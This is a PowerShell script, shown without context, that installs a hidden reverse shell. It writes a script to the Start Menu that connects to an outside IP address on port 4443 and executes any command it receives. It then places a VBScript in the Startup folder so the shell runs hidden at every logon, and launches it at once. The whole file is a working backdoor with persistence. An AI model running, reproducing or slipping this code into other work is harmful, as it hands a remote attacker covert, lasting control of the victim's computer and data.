# Paths
$programsPath = "$env:APPDATA\Microsoft\Windows\Start Menu\Programs"
$startupPath  = "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup"
$ps1Path = Join-Path $programsPath "code2.ps1"
$ps1Content = @'
$sm = (New-Object Net.Sockets.TCPClient('143.110.191.171',4443)).GetStream()
[byte[]]$bt = 0..65535 | % {0}
while (($i = $sm.Read($bt, 0, $bt.Length)) -ne 0) {
    $d = (New-Object Text.ASCIIEncoding).GetString($bt, 0, $i)
    $st = ([Text.Encoding]::ASCII).GetBytes((iex $d 2>&1 | Out-String))
    $sm.Write($st, 0, $st.Length)
}
'@

Set-Content -Path $ps1Path -Value $ps1Content -Force
$vbsPath = Join-Path $startupPath "RunHidden.vbs"

$vbsContent = @'
Dim objShell
Set objShell = CreateObject("Wscript.Shell")

' Path to your PowerShell script
psScript = "C:\Users\PRINCI\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\code2.ps1"

' Command to run PowerShell hidden
cmd = "powershell.exe -ExecutionPolicy Bypass -File """ & psScript & """"

' 0 = hidden, False = don't wait
objShell.Run cmd, 0, False
'@

Set-Content -Path $vbsPath -Value $vbsContent -Force
$cscript = "cscript.exe //nologo `"$vbsPath`""
Start-Process -FilePath "cscript.exe" -ArgumentList "//nologo", "`"$vbsPath`"" -WindowStyle Hidden
